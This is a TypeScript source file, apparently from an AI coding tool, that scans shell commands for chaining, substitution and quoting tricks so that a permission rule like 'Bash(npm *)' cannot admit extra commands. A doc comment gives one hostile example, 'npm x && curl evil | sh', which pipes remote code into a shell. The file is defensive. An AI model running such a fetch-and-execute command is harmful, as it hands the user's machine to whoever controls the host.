import { readsSingleQuoteAsPosix } from '../shell-selection.js';
import type { ResolvedShell } from '../types/runtime.js';

/**
 * Shell characters that chain, redirect, substitute or group one command into another, and a
 * newline, which starts a second command.
 *
 * A `Bash(<glob>)` rule is a glob over the whole command string and `*` crosses anything, so
 * `Bash(npm *)` would also match `npm x && curl evil | sh`. Book cannot express "and nothing else"
 * in its glob language and does not parse shell, so it asks a smaller question with
 * {@link hasCompoundShellSyntax}: does the command contain shell syntax that could run something
 * other than the one command the rule was written for? Two places use the answer:
 *
 * - the capability layer (`allowed-tools` of a command, skill or agent role) refuses a compound
 *   command under a `Bash(<glob>)` rule, so the model sends each command as its own call;
 * - the permission layer admits a call through a `Bash(<pattern>)` allow rule only when the whole
 *   command, trimmed, matches the pattern and is not compound; a compound command falls through to
 *   the normal prompt.
 *
 * The check is quote-aware, but it is a small quote scanner and not a shell parser. A character
 * that chains outside quotes (`;`, `&`, `|`, `<`, `>`, `(`, `)`, `{`, `}`, `$`, a backtick) is
 * literal inside quotes, so `git commit -m "fix(x): y"` is one command. `$` and a backtick still
 * count inside double quotes, where a shell substitutes, and a line break counts everywhere.
 *
 * It stays conservative across sh/bash, PowerShell and cmd.exe: whatever any of them could read as
 * something other than a quote refuses the command (a backslash or caret before a quote, a
 * typographic quote, an unterminated quote). On Windows any single quote refuses the command unless
 * the session shell is known to be a bash or POSIX sh on the MSYS runtime, such as Git Bash (see
 * {@link ScanShell} and {@link hasCompoundShellSyntax}): cmd.exe has no single quote, but the Windows
 * session shell is usually PowerShell or Git Bash, which both read it as a real one, and only a POSIX
 * shell that gets the command byte for byte reads it as sh does, so for any other shell the scanner
 * cannot tell which characters are quoted.
 *
 * The "Always allow" ladder (`permissionRuleLadder`) stays quote-blind on purpose and uses
 * {@link SHELL_CHAINING} raw: a tokenizer that knew quotes would offer rungs with a dangling quote.
 */
export const SHELL_CHAINING = /[;&|><`$(){}\n]/;

/** Line breaks in any shell: LF, CR, NEL, and the Unicode line and paragraph separators. */
export const LINE_BREAK = /[\n\r\u0085\u2028\u2029]/;

/** Typographic quotes U+2018 to U+201E, which PowerShell reads as quote characters. */
const TYPOGRAPHIC_QUOTE_RANGE = '\\u2018-\\u201E';

const TYPOGRAPHIC_QUOTE = new RegExp(`[${TYPOGRAPHIC_QUOTE_RANGE}]`);

/** Every character that can open or close a quote in some shell. */
export const ANY_QUOTE = new RegExp(`['"${TYPOGRAPHIC_QUOTE_RANGE}]`);

/**
 * The part of the session shell the scanner reads: `ResolvedShell.kind`, `file` and `msys`. Git Bash
 * is `kind: 'bash'` with a `file`: `shellExecution` sends a `bash` kind without one to Node's
 * `shell: true`, which is cmd.exe on Windows. `msys` marks a bash or sh on the MSYS runtime, and only
 * a flagged one reads `'` as on Linux (#548). Callers pass the session's `ResolvedShell` as is, so
 * the flag is never dropped on the way.
 */
export type ScanShell = Pick<ResolvedShell, 'kind' | 'file' | 'msys'>;

/**
 * Whether a command contains shell syntax a `Bash(<pattern>)` rule cannot vouch for, so it must be
 * refused or asked about. Surrounding whitespace is not part of the command (the Bash tool runs
 * `command.trim()`), so it is trimmed first. One left-to-right scan, in one of three states:
 * outside quotes, inside single quotes, inside double quotes. True when:
 *
 * - outside quotes, any {@link SHELL_CHAINING} character appears;
 * - inside double quotes, `$` or a backtick appears (every other character is literal);
 * - inside single quotes, nothing is special;
 * - a quote is still open at the end;
 * - a line break appears in any state: in sh `#` can comment out an opening quote, and PowerShell
 *   reads a bare CR as a line break, so no quote state can be trusted across one;
 * - a backslash comes right before `'` or `"` in any state, single quotes included: sh reads it as
 *   a literal quote outside single quotes, PowerShell and cmd.exe read `\"` as a closing quote, and
 *   fish reads `\'` inside single quotes as an escaped quote. The `shell` setting can name any
 *   executable (an unknown one is treated as `sh`), so the scanner cannot tell which characters are
 *   quoted;
 * - a caret comes right before `'` or `"` outside quotes: `^` escapes the quote in cmd.exe;
 * - a typographic quote appears anywhere;
 * - on `win32`, an ASCII `'` appears anywhere, unless `shell` is a bash or POSIX sh on the MSYS
 *   runtime, such as Git Bash (`readsSingleQuoteAsPosix`): there `'` reads as on Linux, because the
 *   Bash tool delivers the command out of band, byte for byte, so the runtime never rebuilds it (see
 *   `shellExecution`, #548). WSL's launchers, cmd, pwsh, powershell, a `bash` or sh without a file,
 *   a non-POSIX shell and no known shell still refuse `'`. So do a Cygwin bash or sh, a shim or copy
 *   of a bash or sh with no MSYS DLL beside it (scoop's `shims\bash.exe`), and busybox-w32 copied as
 *   `sh.exe`: they get the command out of band too, but Windows CI proves only the MSYS runtime's
 *   delivery, so this asks `readsSingleQuoteAsPosix`, never `receivesCommandOutOfBand`. Off win32
 *   `shell` is not read.
 *
 * Every caller passes the same (platform, shell) pair, so the permission gate, the capability gate
 * and the refusal text agree about which commands are compound.
 */
export function hasCompoundShellSyntax(
  command: string,
  platform: NodeJS.Platform = process.platform,
  shell?: ScanShell,
): boolean {
  const text = command.trim();
  const refusesSingleQuote = platform === 'win32' && !readsSingleQuoteAsPosix(shell);
  let state: 'outside' | 'single' | 'double' = 'outside';

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (LINE_BREAK.test(char) || TYPOGRAPHIC_QUOTE.test(char)) return true;
    if (refusesSingleQuote && char === "'") return true;

    const next = text[i + 1];
    const quoteFollows = next === '"' || next === "'";
    if (char === '\\' && quoteFollows) return true;

    if (state === 'single') {
      if (char === "'") state = 'outside';
      continue;
    }

    if (state === 'double') {
      if (char === '$' || char === '`') return true;
      if (char === '"') state = 'outside';
      continue;
    }

    if (char === '^' && quoteFollows) return true;
    if (char === '"') state = 'double';
    else if (char === "'") state = 'single';
    else if (SHELL_CHAINING.test(char)) return true;
  }

  return state !== 'outside';
}

/**
 * A shell keyword whose next word is a command, which a glob on that command cannot see behind it.
 * The keywords that do not (`for`, `case`, `function`) reach a command only past a character the
 * scan already calls unreadable, or past one of these.
 */
const COMMAND_KEYWORD = /^(?:if|then|elif|else|while|until|do|time|coproc|!)(?: |$)/;

/**
 * A redirection that can be set aside: its operator and one plain word as the target, ending at a
 * blank, a chain or the end of the line. What this refuses is what cannot be placed: a heredoc or
 * here-string (`<<`), a process substitution, a missing target, and a target holding a quote, an
 * escape or an expansion. The file descriptor before the operator is the caller's to drop.
 */
const PLACEABLE_REDIRECTION = /^[<>]>?[&|]?[ \t]*[^\s\u0085;&|<>(){}$`'"\\]+(?=[\s\u0085;&|]|$)/;

/** What {@link readShellCommands} makes of a command line. */
export interface ShellCommandReading {
  /**
   * The text a glob may select the line by: the whole line trimmed, then each command it chains, as
   * written and as its words (quotes and backslashes removed, blanks outside quotes collapsed to one
   * space, placeable redirections set aside). Best effort when the line is not `readable`.
   */
  texts: string[];
  /** Whether those are all the commands the line runs, as far as a quote scanner can tell. */
  readable: boolean;
}

/**
 * The commands a line chains, for a reader that needs more than {@link hasCompoundShellSyntax}'s
 * yes or no: a hook narrowed to one command, which should not run on every pipeline in the session.
 * It splits outside quotes on `&&`, `||`, `;`, `|`, `&` and line breaks, in one left-to-right scan
 * over the same three states. It is still a quote scanner and not a shell parser, so a command that
 * another command runs (`sudo rm x`, `bash -c "rm x"`) stays part of that command's text.
 *
 * The line is not `readable`, and the caller decides what that means, when it holds:
 *
 * - `$` or a backtick outside single quotes: an expansion or a substitution can supply any word;
 * - `(`, `)`, `{` or `}` outside quotes: a subshell, a group, a function or a brace expansion;
 * - a redirection {@link PLACEABLE_REDIRECTION} cannot place, a heredoc among them;
 * - a line break inside quotes, where no quote state can be trusted, or after a backslash or a caret,
 *   where one shell continues the command and another ends it;
 * - a quote still open at the end;
 * - a command that opens with a {@link COMMAND_KEYWORD};
 * - what makes {@link hasCompoundShellSyntax} distrust the quotes, read the same way here and for the
 *   same reasons: a backslash before `'` or `"` in any state, a caret before one outside quotes, a
 *   typographic quote anywhere, and on `win32` an ASCII `'`, unless `shell` reads it as POSIX does.
 *
 * A command that is not compound is therefore one command here, and readable unless it opens with
 * a keyword.
 */
export function readShellCommands(
  command: string,
  platform: NodeJS.Platform = process.platform,
  shell?: ScanShell,
): ShellCommandReading {
  const text = command.trim();
  const refusesSingleQuote = platform === 'win32' && !readsSingleQuoteAsPosix(shell);
  let readable =
    !TYPOGRAPHIC_QUOTE.test(text) &&
    !/\\['"]/.test(text) &&
    !(refusesSingleQuote && text.includes("'"));

  const texts = new Set([text]);
  let state: 'outside' | 'single' | 'double' = 'outside';
  let start = 0;
  let words = '';
  const endCommand = (end: number) => {
    const bare = words.trim();
    if (COMMAND_KEYWORD.test(bare)) readable = false;
    for (const reading of [text.slice(start, end).trim(), bare]) {
      if (reading) texts.add(reading);
    }
    start = end + 1;
    words = '';
  };

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (LINE_BREAK.test(char)) {
      const previous = text[i - 1];
      if (state !== 'outside' || previous === '\\' || previous === '^') readable = false;
      state = 'outside';
      endCommand(i);
    } else if (state === 'single') {
      if (char === "'") state = 'outside';
      else words += char;
    } else if (state === 'double') {
      if (char === '$' || char === '`') readable = false;
      if (char === '"') state = 'outside';
      else words += char;
    } else if (char === "'") {
      state = 'single';
    } else if (char === '"') {
      state = 'double';
    } else if (char === '&' || char === '|' || char === ';') {
      endCommand(i);
    } else if ('(){}`'.includes(char)) {
      readable = false;
      endCommand(i);
    } else if (char === '<' || char === '>') {
      const redirection = PLACEABLE_REDIRECTION.exec(text.slice(i));
      if (redirection) {
        words = words.replace(/(^|\s)\d+$/, '$1');
        i += redirection[0].length - 1;
      } else {
        readable = false;
        words += char;
      }
    } else if (/\s/.test(char)) {
      if (words && !words.endsWith(' ')) words += ' ';
    } else if (char !== '\\') {
      if (char === '$' || (char === '^' && /['"]/.test(text[i + 1] ?? ''))) readable = false;
      words += char;
    }
  }
  if (state !== 'outside') readable = false;
  endCommand(text.length);
  return { texts: [...texts], readable };
}
